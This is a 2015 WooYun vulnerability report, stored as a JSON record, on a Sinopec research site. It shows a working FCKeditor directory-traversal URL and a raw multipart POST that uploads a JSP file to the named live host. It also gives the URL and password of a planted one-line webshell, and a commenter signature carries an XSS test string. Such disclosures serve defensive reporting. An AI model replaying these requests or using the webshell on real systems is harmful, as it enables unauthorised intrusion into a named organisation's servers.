{"id": 17012, "wybug_id": "wooyun-2015-0115994", "wybug_title": "中石化某业务系统漏洞打包（Getshell+文件遍历）", "wybug_corp": "中国石油化工股份有限公司", "wybug_author": "茜茜公主", "wybug_date": "2015-05-29 10:19", "wybug_open_date": "2015-07-16 09:48", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向公众公开  简要描述： 上次算错了日期，今天才是我到wooyun的第366天，坨坨的 详细说明：  地址：http://ppt.edri.sinopec.com/CN/volumn/current.shtml\n\n文件遍历\nhttp://ppt.edri.sinopec.com/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../\n\n\n\n\n   漏洞证明：  再演示一下任意文件上传，当然也是因为fck编辑器的不正确配置引起的构造个poc进行上传\nPOST http://ppt.edri.sinopec.com/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=/../js/ HTTP/1.0Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*Referer: Accept-Language: zh-cnContent-Type: multipart/form-data; boundary=---------------------------7de11c161e01e4UA-CPU: x86Pragma: no-cacheUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; User-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; http://bsalsa.com) ; User-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; http://bsalsa.com) (Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)Host: ppt.edri.sinopec.comContent-Length: 223Connection: Keep-Alive-----------------------------7de11c161e01e4Content-Disposition: form-data; name=\"NewFile\"; filename=\"E:\\wooyuntest.jsp\"Content-Type: application/octet-streamwooyun test-----------------------------7de11c161e01e4--\n\n\n因为默认的上传路径有做限制，访问jsp等会跳转到登录页，所以我跨目录传了一句话跨个目录传http://ppt.edri.sinopec.com/js/wooyuntest.jsp\n\n一句话地址：http://ppt.edri.sinopec.com/js/wooyun.jsp密码：woo0yun\n\n\n\n其实我一开始是想找通用型的   修复方案：  正确配置fck编辑器   版权声明：转载请注明来源 茜茜公主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-06-01 09:47 厂商回复： 谢谢，我们将尽快修改 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-26 17:01 |    \t\t中国石油化工股份有限公司(乌云厂商)\t\t \n  您好，是否可以提供相对详细一点的信息，谢谢！    \n     2015-05-29 10:38 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  您好，是否可以提供相对详细一点的信息，谢谢！    \n     2015-05-29 10:42 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  @中国石油化工股份有限公司 厂商你好，现在应能看到细节了吧    \n     2015-05-29 10:47 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  呜呜，之前是走的大厂商，今天漏洞突然变成未审核，然后洞洞变成小厂商，心好痛    \n     2015-05-29 10:50 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  @茜茜公主 不痛不痛，come on !    \n     2015-07-30 18:54 |    \t\t剑影 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:28        | 挖洞需要细心！生活也需要细心！面对任何事...)\t\t \n  @茜茜公主 不哭抱抱    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}